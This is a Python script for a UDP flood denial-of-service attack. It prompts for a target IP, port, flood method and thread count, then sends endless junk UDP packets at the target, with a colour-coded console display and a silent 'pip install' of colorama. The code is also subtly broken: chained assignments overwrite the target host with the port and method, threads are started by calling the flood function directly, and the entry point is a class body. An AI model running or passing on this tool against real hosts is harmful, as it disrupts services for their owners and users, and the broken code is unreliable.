

import os

# -----------------------------------------------

try:

    from colorama import Fore

except:

    os.system('pip install colorama')

    from colorama import Fore

# -----------------------------------------------

import socket

import threading

#import time as clock

# -----------------------------------------------

# Global Variables

host = input(Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTBLUE_EX + " IP >" + Fore.LIGHTMAGENTA_EX + " ")

print()

port = host = input(Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTBLUE_EX + " PORT >" + Fore.LIGHTMAGENTA_EX + " ")

print()

method = host = input(Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTBLUE_EX + " METHOD >" + Fore.LIGHTMAGENTA_EX + " ")

print()

loops = int(input(Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTBLUE_EX + " THREADS >" + Fore.LIGHTMAGENTA_EX + " "))

print()

# -----------------------------------------------

def send_packet(amplifier):

    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        s.connect((host, int(port)))

        

        while True:

            s.send(b"\x99" * amplifier)

    except:

        return s.close()

# -----------------------------------------------

class main():

    os.system('clear')

    if method == "UDP-Flood":

        for i in range(loops):

            threading.Thread(target=send_packet(375), daemon=True).start()

            print(Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTBLUE_EX + f" Packets > {i + 1}", end='\r')

    if method == "UDP-Power":

        for i in range(loops):

            threading.Thread(target=send_packet(750), daemon=True).start()

            print(Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTBLUE_EX + f" Packets > {i + 1}", end='\r')

    if method == "UDP-Mix":

        for i in range(loops):

            threading.Thread(target=send_packet(375), daemon=True).start()

            threading.Thread(target=send_packet(750), daemon=True).start()

            print(Fore.LIGHTBLACK_EX + "[" + Fore.LIGHTGREEN_EX + "+" + Fore.LIGHTBLACK_EX + "]" + Fore.LIGHTBLUE_EX + f" Packets > {i + 1}", end='\r')

# -----------------------------------------------

if __name__ == '__main__' and os.name == 'nt':

    main()
